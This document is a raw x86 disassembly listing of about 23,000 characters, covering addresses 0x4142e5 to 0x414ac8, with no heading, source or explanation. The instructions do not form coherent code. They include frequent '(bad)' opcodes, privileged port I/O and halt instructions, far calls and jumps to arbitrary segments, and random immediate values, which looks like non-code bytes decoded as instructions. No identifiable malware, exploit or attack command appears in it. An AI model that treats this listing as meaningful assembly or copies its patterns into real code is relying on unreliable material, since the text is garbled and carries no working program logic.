  4142e5:	rcr    DWORD PTR [edi+0x5b33d5d3],0xfa
  4142ec:	jl     0x414274
  4142ee:	sbb    ah,BYTE PTR [edi+0x17]
  4142f1:	(bad)  
  4142f2:	jle    0x4142af
  4142f4:	lea    ebx,[esi+0x15]
  4142f7:	(bad)  
  4142f8:	fwait
  4142f9:	out    0x85,al
  4142fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142fc:	jns    0x41431e
  4142fe:	(bad)  
  4142ff:	cli    
  414300:	push   es
  414301:	mov    eax,ds:0x7e401dce
  414306:	dec    ebx
  414307:	outs   dx,BYTE PTR ds:[esi]
  414308:	unpcklps xmm6,XMMWORD PTR [ecx]
  41430b:	fmul   DWORD PTR [edx]
  41430d:	mov    ds:0x6470ee38,al
  414312:	cmc    
  414313:	daa    
  414314:	jne    0x414337
  414316:	sub    al,0x8d
  414318:	mov    dh,0x85
  41431a:	mov    ecx,0xc05387ea
  41431f:	mov    esp,0x2a6c91f7
  414324:	leave  
  414325:	test   BYTE PTR [eax-0x190db4b6],bh
  41432b:	xor    DWORD PTR [eax+0x9],edx
  41432e:	fwait
  41432f:	in     eax,0x12
  414331:	mov    dl,0x90
  414333:	push   0x2
  414335:	mov    ds:0x348a26f5,al
  41433a:	add    al,0x1d
  41433c:	rcr    DWORD PTR [eax],1
  41433e:	mov    al,ch
  414340:	push   cs
  414341:	inc    ebx
  414342:	mov    ah,BYTE PTR [ebx+0x3d]
  414345:	lahf   
  414346:	lods   eax,DWORD PTR ds:[esi]
  414347:	mov    eax,DWORD PTR [ecx]
  414349:	(bad)  
  41434a:	cli    
  41434b:	std    
  41434c:	jns    0x4142df
  41434e:	dec    esp
  41434f:	inc    eax
  414350:	leave  
  414351:	call   0xa592:0x56e824f1
  414358:	out    dx,eax
  414359:	neg    BYTE PTR [ebx-0x4c86870]
  41435f:	xchg   edi,eax
  414360:	loopne 0x41433b
  414362:	dec    edi
  414363:	adc    eax,DWORD PTR [eax+0x32]
  414366:	sub    DWORD PTR [edx-0x62],edx
  414369:	sbb    al,0xf5
  41436b:	(bad)  [edx-0xa]
  41436e:	push   ebx
  41436f:	add    esp,DWORD PTR [ebp-0x79]
  414372:	arpl   WORD PTR [eax-0x6e],ax
  414375:	scas   eax,DWORD PTR es:[edi]
  414376:	mov    DWORD PTR es:[edx-0x2aa0b53f],esi
  41437d:	sbb    ch,BYTE PTR [edx-0x2db5b15e]
  414383:	xor    ch,BYTE PTR [ebx]
  414385:	inc    ebp
  414386:	daa    
  414387:	loop   0x4143a4
  414389:	fistp  WORD PTR [ebx+0x954a7f0]
  41438f:	pop    ds
  414390:	mov    ch,0xe1
  414392:	std    
  414393:	add    esp,DWORD PTR [edx-0x6e4daf0f]
  414399:	sbb    DWORD PTR [edi+edi*4-0x5957536c],edx
  4143a0:	clc    
  4143a1:	push   edx
  4143a2:	cmp    al,0x15
  4143a4:	mov    ah,0x4a
  4143a6:	mov    bl,0x76
  4143a8:	or     eax,0x62cc983c
  4143ad:	or     BYTE PTR ds:0xf59ab7ae,0xf5
  4143b4:	lock hlt 
  4143b6:	jle    0x4143e0
  4143b8:	push   esp
  4143b9:	ss aam 0x5
  4143bc:	(bad)  
  4143bd:	call   0x2daebbf2
  4143c2:	cmp    eax,0x20e01ecb
  4143c7:	cmp    DWORD PTR [edx],eax
  4143c9:	sub    esp,ebp
  4143cb:	mov    ds:0xf69e920,al
  4143d0:	sub    al,0x3
  4143d2:	inc    esi
  4143d3:	loopne 0x414454
  4143d5:	hlt    
  4143d6:	xchg   BYTE PTR [ebx+0x2e],dl
  4143d9:	or     ah,cl
  4143db:	das    
  4143dc:	inc    edx
  4143dd:	outs   dx,BYTE PTR ds:[esi]
  4143de:	xchg   ebp,eax
  4143df:	mov    ah,0x4c
  4143e1:	add    ch,BYTE PTR [ecx+0x18e8f990]
  4143e7:	xchg   ebx,eax
  4143e8:	mov    ss,WORD PTR [edi-0x6f]
  4143eb:	adc    ch,dl
  4143ed:	jecxz  0x4143b2
  4143ef:	pop    ecx
  4143f0:	test   ebx,eax
  4143f2:	add    al,0x2b
  4143f4:	jo     0x414399
  4143f6:	and    al,0x7a
  4143f8:	mov    edi,0x5819bc10
  4143fd:	mov    al,0x7
  4143ff:	dec    ebx
  414400:	push   ebx
  414401:	test   al,0xe5
  414403:	dec    esp
  414404:	(bad)  
  414405:	(bad)  [edx]
  414407:	and    ecx,DWORD PTR [eax-0x4cc455dd]
  41440d:	iret   
  41440e:	xor    al,0x6f
  414410:	xor    al,0x8f
  414412:	sbb    esp,DWORD PTR [edx-0x56]
  414415:	test   DWORD PTR [ecx*4-0x36b2aba6],esp
  41441c:	sub    dh,BYTE PTR ds:0x4b244bcc
  414422:	jns    0x4143c0
  414424:	mov    ebp,0xf8fea8d5
  414429:	jecxz  0x414434
  41442b:	aaa    
  41442c:	add    cl,BYTE PTR [esi-0x4eba1c61]
  414432:	in     al,dx
  414433:	add    al,0x99
  414435:	jbe    0x41446c
  414437:	jmp    0x4143f6
  414439:	push   0x50
  41443b:	mov    al,0x65
  41443d:	mov    eax,0x21c4bfa0
  414442:	pop    esp
  414443:	sar    BYTE PTR [eax-0x26a8f97a],0xc6
  41444a:	fsubr  st,st(3)
  41444c:	arpl   cx,ax
  41444e:	cwde   
  41444f:	dec    edx
  414450:	mov    eax,ds:0xa4395fe9
  414455:	(bad)  
  414456:	outs   dx,BYTE PTR ds:[esi]
  414457:	xchg   ecx,eax
  414458:	fdivr  DWORD PTR [ebx]
  41445a:	jne    0x4144c3
  41445c:	(bad)  
  414460:	jecxz  0x414464
  414462:	adc    BYTE PTR [edi-0x21],cl
  414465:	popf   
  414466:	xor    eax,0xd0c101e3
  41446b:	out    dx,al
  41446c:	(bad)  
  41446d:	sbb    ebp,ebp
  41446f:	repnz test eax,0x9ea9a22a
  414475:	out    0x9e,eax
  414477:	inc    DWORD PTR [edx-0x7e1b009c]
  41447d:	or     eax,0x4fbe15a1
  414482:	ret    0x82cd
  414485:	stos   DWORD PTR es:[edi],eax
  414486:	jne    0x41448b
  414488:	pushf  
  414489:	ss (bad) 
  41448b:	outs   dx,BYTE PTR ss:[esi]
  41448d:	jmp    0x66f4:0x443c9020
  414494:	retf   
  414495:	mov    al,ds:0xb1aee649
  41449a:	mov    WORD PTR [ebx],es
  41449c:	or     al,0x3d
  41449e:	popf   
  41449f:	inc    eax
  4144a0:	pop    esi
  4144a1:	add    dh,BYTE PTR [edx-0x5a1266f7]
  4144a7:	imul   esi,DWORD PTR [ebx-0x3cf5c4c8],0x6e
  4144ae:	jecxz  0x414491
  4144b0:	pushf  
  4144b1:	dec    ecx
  4144b2:	std    
  4144b3:	sbb    eax,0xb495669c
  4144b8:	dec    edx
  4144b9:	out    dx,al
  4144ba:	mov    WORD PTR [esi+0x2c804de3],es
  4144c0:	push   es
  4144c1:	add    DWORD PTR [ecx+0x64],0x2855c86d
  4144c8:	mov    esi,0x4d6480a9
  4144cd:	sti    
  4144ce:	sti    
  4144cf:	aad    0x93
  4144d1:	fld    QWORD PTR [eax+0x6]
  4144d4:	sub    BYTE PTR [ecx],0x6c
  4144d7:	addr16 mov edx,0x4e21e447
  4144dd:	fstp   TBYTE PTR [ebx]
  4144df:	adc    esp,ebp
  4144e1:	mov    edi,0x52782fa7
  4144e6:	mov    ecx,gs
  4144e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144e9:	sbb    BYTE PTR [ecx-0x17],cl
  4144ec:	xchg   DWORD PTR [ebx+ebp*4+0x7b],esp
  4144f0:	retf   
  4144f1:	sub    al,BYTE PTR [esi+0x60]
  4144f4:	pop    edx
  4144f5:	jmp    0xe6d4:0xbd68341e
  4144fc:	jae    0x4144a5
  4144fe:	imul   edx,DWORD PTR [edi+0x5451e298],0x84947564
  414508:	push   ebx
  414509:	lods   al,BYTE PTR ds:[esi]
  41450a:	shl    BYTE PTR [ebp+0x30],cl
  41450d:	adc    DWORD PTR [edi],eax
  41450f:	fcomp  QWORD PTR [edi]
  414511:	scas   eax,DWORD PTR es:[di]
  414513:	(bad)  
  414514:	pop    ds
  414515:	daa    
  414516:	inc    ecx
  414517:	cdq    
  414518:	inc    ecx
  414519:	es cli 
  41451b:	jno    0x4144e1
  41451d:	ds adc dh,bl
  414520:	in     al,dx
  414521:	mov    al,BYTE PTR [edi+0x3b35c0ef]
  414527:	inc    esi
  414528:	je     0x414503
  41452a:	lahf   
  41452b:	pop    esi
  41452c:	retf   
  41452d:	xor    al,0x99
  41452f:	jnp    0x414532
  414531:	repz arpl si,bp
  414534:	push   edx
  414535:	dec    esp
  414536:	xchg   ebx,eax
  414537:	scas   eax,DWORD PTR es:[edi]
  414538:	imul   ebx,ebx,0x29
  41453b:	or     al,0x6c
  41453d:	retf   0xd493
  414540:	mov    esp,0xc3b438f1
  414545:	out    dx,eax
  414546:	(bad)  
  414547:	scas   al,BYTE PTR es:[edi]
  414548:	or     al,0x99
  41454a:	pop    ebp
  41454b:	push   esi
  41454c:	push   edx
  41454d:	(bad)  [esi]
  41454f:	icebp  
  414550:	cmp    BYTE PTR [ecx+0x26e46c72],bh
  414556:	dec    esi
  414557:	mov    esp,0x167b40dd
  41455c:	jmp    0x519ba162
  414561:	test   al,0x1
  414563:	push   es
  414564:	lahf   
  414565:	xor    dl,BYTE PTR [eax+0x7fbed895]
  41456b:	dec    esp
  41456c:	bound  esp,QWORD PTR [eax]
  41456e:	retf   0x771c
  414571:	stc    
  414572:	lds    ebp,FWORD PTR [edi-0x68]
  414575:	dec    ebp
  414576:	in     eax,dx
  414577:	push   ss
  414578:	sub    DWORD PTR [esi],ebx
  41457a:	aad    0x99
  41457c:	sub    al,0x6c
  41457e:	call   0x52c5:0x45d5
  414584:	xchg   edx,eax
  414585:	nop
  414586:	or     eax,0x1976fa7b
  41458b:	mov    ?,WORD PTR [eax+0x56]
  41458e:	cmp    al,0x94
  414590:	push   ds
  414591:	push   cs
  414592:	ret    0xfc51
  414595:	inc    edi
  414596:	lahf   
  414597:	sub    dl,BYTE PTR [eax-0x75]
  41459a:	mov    edx,0xf3139acd
  41459f:	and    al,0x64
  4145a1:	mov    bh,0xe1
  4145a3:	xchg   DWORD PTR [edx+0x1a],ecx
  4145a6:	cmc    
  4145a7:	loop   0x4145db
  4145a9:	mov    ds:0x3a106321,eax
  4145ae:	add    ebp,DWORD PTR [ecx+ecx*1]
  4145b1:	das    
  4145b2:	iret   
  4145b3:	scas   eax,DWORD PTR es:[edi]
  4145b4:	jle    0x4145d5
  4145b6:	inc    esp
  4145b7:	les    eax,FWORD PTR [edx+0x8f8a950]
  4145bd:	arpl   ax,ax
  4145bf:	xchg   esi,eax
  4145c0:	pop    esp
  4145c1:	out    dx,eax
  4145c2:	jmp    0x41457d
  4145c4:	mov    ecx,0x6c58bec1
  4145c9:	inc    esi
  4145ca:	sub    ecx,DWORD PTR [ecx-0x44]
  4145cd:	mov    ebp,0x403ba44b
  4145d2:	inc    esp
  4145d3:	ins    BYTE PTR es:[edi],dx
  4145d4:	cmp    cl,bl
  4145d6:	call   FWORD PTR [esi-0x158aefd3]
  4145dc:	mov    WORD PTR [esi*1-0x1bc90ea4],ss
  4145e3:	aas    
  4145e4:	nop
  4145e5:	rol    BYTE PTR [ebx+edi*2-0x1a914c3a],1
  4145ec:	jne    0x414570
  4145ee:	pop    DWORD PTR [esi-0x3b]
  4145f1:	xchg   ebp,eax
  4145f2:	repz jmp 0x362b311f
  4145f8:	mov    esp,0x5f21e0a3
  4145fd:	ds ret 
  4145ff:	rcl    BYTE PTR ds:0xd54e69f0,1
  414605:	lods   eax,DWORD PTR ds:[esi]
  414606:	mov    ds:0x6b37f696,al
  41460b:	lods   eax,DWORD PTR ds:[esi]
  41460c:	scas   al,BYTE PTR es:[edi]
  41460d:	mov    al,0x59
  41460f:	mov    bl,bh
  414611:	dec    esp
  414612:	pop    eax
  414613:	inc    esi
  414614:	mov    al,ds:0xc791db3
  414619:	cmp    al,0xcb
  41461b:	sti    
  41461c:	or     DWORD PTR ds:0xad3ed5f8,eax
  414622:	lea    edx,[edi+0x19]
  414625:	xor    DWORD PTR [esi],esp
  414627:	ds add al,0x81
  41462a:	mov    esi,0x8cce10bb
  41462f:	sbb    eax,DWORD PTR [eax+0x77677e07]
  414635:	cwde   
  414636:	(bad)  
  414637:	xor    al,bh
  414639:	xor    dh,dl
  41463b:	gs rol ebp,cl
  41463e:	sub    bl,bh
  414640:	mov    bh,BYTE PTR [eax+0x58]
  414643:	pop    edx
  414644:	inc    ebp
  414645:	enter  0x3b16,0x20
  414649:	pop    edx
  41464a:	xor    al,0xce
  41464c:	add    al,0xfe
  41464e:	cs jns 0x414673
  414651:	mov    WORD PTR [eax-0x4e451978],gs
  414657:	mov    dh,0x47
  414659:	in     al,0x17
  41465b:	stos   BYTE PTR es:[edi],al
  41465c:	add    DWORD PTR [esi],ebx
  41465e:	pop    edx
  41465f:	xor    BYTE PTR [esp+edi*1],0xc2
  414663:	sbb    BYTE PTR [ecx-0x42],ah
  414666:	lds    ebx,FWORD PTR [edi+0x67]
  414669:	sub    eax,0xb37492ee
  41466e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41466f:	pop    eax
  414670:	mov    eax,ds:0xa01df243
  414675:	pop    esp
  414676:	add    eax,0x53579846
  41467b:	sub    dl,BYTE PTR [si]
  41467e:	das    
  41467f:	in     al,0x79
  414681:	inc    esp
  414682:	clc    
  414683:	cmp    BYTE PTR [edi+0x3c],ah
  414686:	adc    ecx,ebp
  414688:	fs loope 0x414627
  41468b:	popa   
  41468c:	in     eax,dx
  41468d:	cmp    al,BYTE PTR [ebp+0x68312741]
  414693:	add    cl,BYTE PTR [ebx]
  414695:	jbe    0x414649
  414697:	mov    ss,edx
  414699:	mov    fs,WORD PTR [esi]
  41469b:	jb     0x41464f
  41469d:	imul   DWORD PTR [ebp+0x666ebaf6]
  4146a3:	loop   0x414653
  4146a5:	mov    al,0x38
  4146a7:	lods   al,BYTE PTR ds:[si]
  4146a9:	inc    esp
  4146aa:	sahf   
  4146ab:	mov    ecx,ecx
  4146ad:	int3   
  4146ae:	icebp  
  4146af:	pushf  
  4146b0:	pop    ecx
  4146b1:	adc    BYTE PTR [edx*4-0x3ca78b8c],ch
  4146b8:	test   al,0x50
  4146ba:	in     eax,0xb5
  4146bc:	call   0x7bfa0ee7
  4146c1:	push   ds
  4146c2:	imul   edx,eax,0xfffffffe
  4146c5:	fs in  eax,0x6e
  4146c8:	and    al,0x70
  4146ca:	jb     0x41471e
  4146cc:	push   ebx
  4146cd:	cli    
  4146ce:	sub    esp,eax
  4146d0:	xchg   esi,eax
  4146d1:	sbb    DWORD PTR [esi-0x2318e897],ebx
  4146d7:	xlat   BYTE PTR ds:[ebx]
  4146d8:	es mov esp,edx
  4146db:	mov    bh,0xf8
  4146dd:	xchg   BYTE PTR gs:[ecx],ah
  4146e0:	xchg   ebx,eax
  4146e1:	mov    al,ds:0xd0646051
  4146e6:	repnz imul ebx,DWORD PTR [ecx],0x42fcdce7
  4146ed:	and    bl,BYTE PTR [edx-0x6ff00d1c]
  4146f3:	out    0xfb,al
  4146f5:	popf   
  4146f6:	mov    ecx,0xdd72c52a
  4146fb:	jge    0x41472d
  4146fd:	idiv   BYTE PTR [esp+0xa]
  414701:	out    dx,al
  414702:	xor    ebp,ebp
  414704:	cmp    DWORD PTR [ebp+0x159d3260],edx
  41470a:	hlt    
  41470b:	fdivr  QWORD PTR [ecx-0x10be973a]
  414712:	fsub   DWORD PTR [esi]
  414714:	(bad)  
  414715:	sub    eax,DWORD PTR [ecx]
  414717:	lea    esi,ds:[esi+eiz*2-0x75]
  41471c:	shr    BYTE PTR [ebx],0x11
  41471f:	adc    al,0x55
  414721:	push   ebp
  414722:	jb     0x414750
  414724:	sti    
  414725:	dec    ebp
  414726:	xor    DWORD PTR [edi],edi
  414728:	mov    esi,DWORD PTR [ebx]
  41472a:	xor    dh,BYTE PTR [edi+0x6aa3578d]
  414730:	inc    ebp
  414731:	mov    ch,0xe4
  414733:	jle    0x4146b8
  414735:	clc    
  414736:	push   esp
  414737:	hlt    
  414738:	cmp    al,0x2e
  41473a:	xlat   BYTE PTR ds:[ebx]
  41473b:	out    dx,al
  41473c:	dec    esp
  41473d:	mov    dl,dh
  41473f:	int3   
  414740:	jne    0x4147a4
  414742:	test   BYTE PTR [ebx+esi*4-0x6b21c6d2],0x57
  41474a:	sbb    DWORD PTR [edx],esp
  41474c:	push   ss
  41474d:	call   0x35da:0x13b87994
  414754:	(bad)  
  414755:	sbb    edi,DWORD PTR ds:0x7cfd8461
  41475b:	jb     0x4146e5
  41475d:	repz (bad) [edi+0x7912b37c]
  414764:	(bad)  [edx+esi*4]
  414767:	pusha  
  414768:	lock push esp
  41476a:	mov    cl,0x88
  41476c:	in     eax,dx
  41476d:	xor    DWORD PTR [ecx+0x68],esi
  414770:	ret    
  414771:	int    0x19
  414773:	pushf  
  414774:	ret    0xb4c3
  414777:	push   eax
  414778:	sbb    ebx,DWORD PTR [eax]
  41477a:	cwde   
  41477b:	xchg   ebx,eax
  41477c:	ins    BYTE PTR es:[edi],dx
  41477d:	cld    
  41477e:	jg     0x4147bc
  414780:	fninit 
  414782:	repnz add ebx,esp
  414785:	or     DWORD PTR [ebx+0x2a4cdbda],edi
  41478b:	sub    bh,bl
  41478d:	push   eax
  41478e:	adc    edi,DWORD PTR [ebp-0x55]
  414791:	in     eax,0x32
  414793:	(bad)  
  414794:	mov    ebp,0xf3462869
  414799:	cmp    al,0xae
  41479b:	out    dx,al
  41479c:	push   esi
  41479d:	adc    DWORD PTR [ebx],edx
  41479f:	into   
  4147a0:	rol    esi,1
  4147a2:	sti    
  4147a3:	pusha  
  4147a4:	mov    ds:0xb6af74cc,eax
  4147a9:	aad    0x27
  4147ab:	sbb    ecx,DWORD PTR [edx-0x2f41bf17]
  4147b1:	clc    
  4147b2:	pop    eax
  4147b3:	xchg   DWORD PTR [edi-0x27c5287b],ebp
  4147b9:	jnp    0x4147d9
  4147bb:	pop    ebx
  4147bc:	or     BYTE PTR [eax+0x5604ac41],bl
  4147c2:	push   cs
  4147c3:	into   
  4147c4:	popf   
  4147c5:	xor    eax,0x8b829a61
  4147ca:	lds    esi,FWORD PTR [ebx-0xbb4c940]
  4147d0:	jb     0x4147ee
  4147d2:	scas   eax,DWORD PTR es:[edi]
  4147d3:	push   es
  4147d4:	fs ror ch,1
  4147d7:	sar    ebp,1
  4147d9:	(bad)  
  4147da:	mov    esi,0x2da3e796
  4147df:	clc    
  4147e0:	add    DWORD PTR [ecx-0x6eba318b],0x32029561
  4147ea:	stos   DWORD PTR es:[edi],eax
  4147eb:	outs   dx,BYTE PTR ds:[esi]
  4147ec:	mov    esi,0x9ded97cd
  4147f1:	push   ecx
  4147f2:	iret   
  4147f3:	pop    esi
  4147f4:	fsubr  QWORD PTR [edx]
  4147f6:	mov    ah,0xc6
  4147f8:	push   esp
  4147f9:	retf   
  4147fa:	and    BYTE PTR [ecx],bl
  4147fc:	mov    edi,DWORD PTR [edi]
  4147fe:	jmp    0x7c09e2e4
  414803:	sbb    eax,0x5a39919d
  414808:	jge    0x41481e
  41480a:	pop    eax
  41480b:	inc    eax
  41480c:	dec    eax
  41480d:	jmp    0xdd9c5c89
  414812:	sub    cl,ch
  414814:	imul   ebx,DWORD PTR [edi],0xffffffdc
  414817:	push   es
  414818:	int3   
  414819:	mov    edx,0x444127db
  41481e:	enter  0xe0e1,0x7f
  414822:	in     eax,0x72
  414824:	aaa    
  414825:	sub    esp,esi
  414827:	js     0x414819
  414829:	add    BYTE PTR [ebp+0x3b],al
  41482c:	pop    ebp
  41482d:	es hlt 
  41482f:	jl     0x4147c7
  414831:	test   BYTE PTR [eax+0x792426bd],dh
  414837:	out    0x6c,eax
  414839:	sub    ecx,DWORD PTR [ecx+ebp*4-0x1fab64df]
  414840:	nop
  414841:	jae    0x414891
  414843:	int    0xf
  414845:	jno    0x41483f
  414847:	xor    al,0xd5
  414849:	sub    bh,BYTE PTR [edi+0x4124df1d]
  41484f:	cdq    
  414850:	sub    DWORD PTR [esi-0x41d4c44],0x1a
  414857:	push   ecx
  414858:	cs xchg edi,eax
  41485a:	push   ds
  41485b:	add    BYTE PTR [eax-0x3d],0x5a
  41485f:	add    cl,BYTE PTR [eax+0x15]
  414862:	mov    ecx,0x98e99247
  414867:	test   DWORD PTR [ebx+0x70],0xeeccc48
  41486e:	push   es
  41486f:	imul   esp,edi,0xffffffa3
  414872:	push   edi
  414873:	in     al,dx
  414874:	lea    eax,[edi-0x6b]
  414877:	hlt    
  414878:	sbb    DWORD PTR [eax+ebx*1],ebx
  41487b:	and    dh,0xde
  41487e:	ret    0x7c30
  414881:	sbb    BYTE PTR [esi-0x62e357b1],ah
  414887:	mov    ecx,0xfcf3a29f
  41488c:	clc    
  41488d:	gs push ebx
  41488f:	jnp    0x414843
  414891:	ins    DWORD PTR es:[edi],dx
  414892:	repnz inc edi
  414894:	(bad)  [eax+0x5a9dada4]
  41489a:	adc    esp,DWORD PTR [edx]
  41489c:	(bad)  
  41489d:	mov    ds:0xcebe5780,eax
  4148a2:	into   
  4148a3:	mov    al,0xf4
  4148a5:	jae    0x4148d1
  4148a7:	cdq    
  4148a8:	dec    ecx
  4148a9:	mov    esp,0x359feadc
  4148ae:	push   ds
  4148af:	in     eax,dx
  4148b0:	mov    BYTE PTR [ecx-0x2e12f48e],dh
  4148b6:	call   0x17a56a63
  4148bb:	ins    DWORD PTR es:[edi],dx
  4148bc:	cdq    
  4148bd:	cld    
  4148be:	inc    esp
  4148bf:	or     DWORD PTR [esi],edx
  4148c1:	cs aam 0xb0
  4148c4:	add    BYTE PTR [ecx+0x48],bl
  4148c7:	out    0xe5,al
  4148c9:	shl    BYTE PTR [eax-0x2b],0x69
  4148cd:	(bad)  [esi]
  4148cf:	mov    ds:0xda86b232,al
  4148d4:	rcr    ah,1
  4148d6:	push   ebp
  4148d7:	mov    cl,0xd7
  4148d9:	repz mov ds:0x571f8543,eax
  4148df:	in     eax,dx
  4148e0:	fcomp  st(2)
  4148e2:	(bad)  
  4148e3:	pop    esp
  4148e4:	jne    0x4148c8
  4148e6:	fild   WORD PTR [eax+0x6d10e6b4]
  4148ec:	rol    esi,0xcc
  4148ef:	xchg   BYTE PTR [eax-0x67],ah
  4148f2:	enter  0xc31e,0xfe
  4148f6:	popa   
  4148f7:	out    0xff,al
  4148f9:	icebp  
  4148fa:	in     eax,dx
  4148fb:	xchg   ecx,edx
  4148fd:	jae    0x4148e9
  4148ff:	add    edx,ebx
  414901:	test   DWORD PTR [edi+0x3309fb2f],esi
  414907:	xor    esp,DWORD PTR [edx+0x5b]
  41490a:	daa    
  41490b:	mov    ds:0x317764ce,al
  414910:	sub    al,0x7d
  414912:	test   eax,0x88ebc882
  414917:	aam    0x61
  414919:	es out 0x55,eax
  41491c:	ja     0x414993
  41491e:	sbb    al,0x81
  414920:	mov    ecx,ds
  414922:	jns    0x414997
  414924:	xor    dh,BYTE PTR [edi-0xddd57b0]
  41492a:	shl    DWORD PTR [ebx],1
  41492c:	js     0x414967
  41492e:	stos   BYTE PTR es:[edi],al
  41492f:	xchg   ebp,eax
  414930:	mul    cl
  414932:	sub    BYTE PTR [ecx],ah
  414934:	adc    DWORD PTR [esi-0xe],0xffffffeb
  414938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414939:	test   al,0xdf
  41493b:	mov    dh,0x63
  41493d:	jmp    esi
  41493f:	and    DWORD PTR [ebx-0x43067f5f],ebx
  414945:	mov    ch,0x1b
  414947:	inc    edx
  414948:	adc    BYTE PTR [edi+0x1b],ch
  41494b:	cli    
  41494c:	pop    es
  41494d:	cmp    esi,esi
  41494f:	dec    edx
  414950:	jb     0x4148f7
  414952:	ins    DWORD PTR es:[edi],dx
  414953:	mov    edi,DWORD PTR [ebx+0x38]
  414956:	sbb    cl,BYTE PTR [esi]
  414958:	iret   
  414959:	lock pop edx
  41495b:	sbb    BYTE PTR [ebx],ch
  41495d:	adc    al,0xe0
  41495f:	adc    edx,DWORD PTR [esi+edi*1]
  414962:	mov    ecx,0x47e2c8d6
  414967:	mov    bl,0x67
  414969:	xchg   ebp,eax
  41496a:	push   edx
  41496b:	fwait
  41496c:	out    dx,eax
  41496d:	push   edx
  41496e:	jno    0x41495a
  414970:	imul   esp,DWORD PTR [eax-0x5361228b],0xf0bcac1c
  41497a:	sub    ecx,esi
  41497c:	iret   
  41497d:	cdq    
  41497e:	fiadd  DWORD PTR [ecx]
  414980:	shr    BYTE PTR [edx-0x23],1
  414983:	mov    bl,0x6f
  414985:	or     edx,DWORD PTR [eax]
  414987:	jb     0x4149f6
  414989:	int3   
  41498a:	ins    DWORD PTR es:[edi],dx
  41498b:	sub    BYTE PTR [edx+edi*8-0x24],bl
  41498f:	das    
  414990:	(bad)  
  414991:	mov    ch,0x86
  414993:	sbb    DWORD PTR [ecx+0x73],edi
  414996:	inc    ebx
  414997:	add    eax,0xcb6f6851
  41499c:	and    bl,bh
  41499e:	fistp  QWORD PTR [esi-0x3c]
  4149a1:	pusha  
  4149a2:	push   0xffffff86
  4149a4:	xchg   ecx,esi
  4149a6:	enter  0xecad,0x4f
  4149aa:	sbb    DWORD PTR [eax+0x3e6b90fc],ebx
  4149b0:	rep outs dx,DWORD PTR ds:[esi]
  4149b2:	fwait
  4149b3:	sub    eax,DWORD PTR [edi+edi*4+0x5da37072]
  4149ba:	pop    esi
  4149bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149bc:	sbb    edi,ebx
  4149be:	jl     0x414a28
  4149c0:	mov    al,0x79
  4149c2:	jae    0x4149d8
  4149c4:	pop    ecx
  4149c5:	adc    eax,0x2763014d
  4149ca:	adc    BYTE PTR [eax],ch
  4149cc:	fidivr DWORD PTR [ebp+eiz*4+0x4853ee3b]
  4149d3:	xor    eax,ebp
  4149d5:	cmc    
  4149d6:	sub    ebp,ebp
  4149d8:	clc    
  4149d9:	das    
  4149da:	push   cs
  4149db:	mov    ds:0xa748b070,eax
  4149e0:	ins    DWORD PTR es:[edi],dx
  4149e1:	and    ah,BYTE PTR [esi]
  4149e3:	jbe    0x414a09
  4149e5:	push   ds
  4149e6:	mov    ebx,0x75650ecd
  4149eb:	popa   
  4149ec:	enter  0x2457,0x7e
  4149f0:	popf   
  4149f1:	xor    al,0x7
  4149f3:	xor    bl,BYTE PTR [ebx]
  4149f5:	dec    ebp
  4149f6:	push   0xffffff82
  4149f8:	out    dx,al
  4149f9:	lds    ebx,FWORD PTR [eax+0x42e979c0]
  4149ff:	pop    ecx
  414a00:	dec    edx
  414a01:	and    bh,BYTE PTR [esi+0x73]
  414a04:	mov    eax,0x18dd2ffc
  414a09:	stos   BYTE PTR es:[edi],al
  414a0a:	and    eax,0x7ea5764a
  414a0f:	xlat   BYTE PTR ds:[ebx]
  414a10:	mov    al,ds:0x294511db
  414a15:	call   0xaf47da6e
  414a1a:	aaa    
  414a1b:	cdq    
  414a1c:	mov    dl,0x3e
  414a1e:	or     DWORD PTR [edi+0x5f],ebx
  414a21:	mov    bl,BYTE PTR [eax+0x420ec7a]
  414a27:	ins    BYTE PTR es:[edi],dx
  414a28:	push   ss
  414a29:	or     ch,BYTE PTR [ecx-0x4417bbdf]
  414a2f:	in     al,dx
  414a30:	mov    bl,0x7f
  414a32:	mov    eax,0x96662c7c
  414a37:	push   edx
  414a38:	enter  0xf807,0xea
  414a3c:	test   DWORD PTR [eax+eax*8],0x339e8ac6
  414a43:	fs sbb al,0xef
  414a46:	loop   0x414ac3
  414a48:	mov    esp,ebp
  414a4a:	loop   0x4149d1
  414a4c:	and    bh,0x45
  414a4f:	xchg   ecx,eax
  414a50:	in     al,dx
  414a51:	out    dx,eax
  414a52:	scas   eax,DWORD PTR es:[edi]
  414a53:	cld    
  414a54:	mov    ch,0xc4
  414a56:	sti    
  414a57:	jle    0x414a3a
  414a59:	xchg   ecx,eax
  414a5a:	mov    ds:0xed6e41d,eax
  414a5f:	mov    eax,0x5785cdac
  414a64:	mov    ebp,0xae3748e1
  414a69:	rol    BYTE PTR [ecx+0x7b],0x8a
  414a6d:	popf   
  414a6e:	stos   BYTE PTR es:[edi],al
  414a6f:	aas    
  414a70:	ja     0x414a53
  414a72:	and    ch,0xaa
  414a75:	and    DWORD PTR [ebx],ebp
  414a77:	outs   dx,BYTE PTR ds:[esi]
  414a78:	sbb    dh,BYTE PTR [eax]
  414a7a:	xor    DWORD PTR [eax-0x799c050e],ecx
  414a80:	lods   eax,DWORD PTR ds:[esi]
  414a81:	add    al,0xa9
  414a83:	rcl    BYTE PTR [edi-0x72e738c3],0x64
  414a8a:	sub    al,cl
  414a8c:	mov    bl,0xb9
  414a8e:	mov    esi,0xf6b3edb3
  414a93:	aas    
  414a94:	pop    edi
  414a95:	pop    eax
  414a96:	fbstp  TBYTE PTR [esi]
  414a98:	fisttp QWORD PTR [edx]
  414a9a:	in     eax,0xf3
  414a9c:	jne    0x414a26
  414a9e:	cs push eax
  414aa0:	rcl    BYTE PTR [eax-0x19],0xda
  414aa4:	in     al,dx
  414aa5:	push   ebx
  414aa6:	lods   eax,DWORD PTR ds:[esi]
  414aa7:	xchg   ebp,eax
  414aa8:	sbb    edx,DWORD PTR ds:0x268aae8a
  414aae:	adc    al,0x1a
  414ab0:	fwait
  414ab1:	js     0x414aa4
  414ab3:	ret    0xa261
  414ab6:	push   ss
  414ab7:	jo     0x414af6
  414ab9:	aad    0x44
  414abb:	out    dx,al
  414abc:	mov    ds:0x1b48c0b2,eax
  414ac1:	mov    esp,0xdd4b5847
  414ac6:	je     0x414ac7
  414ac8:	cld    
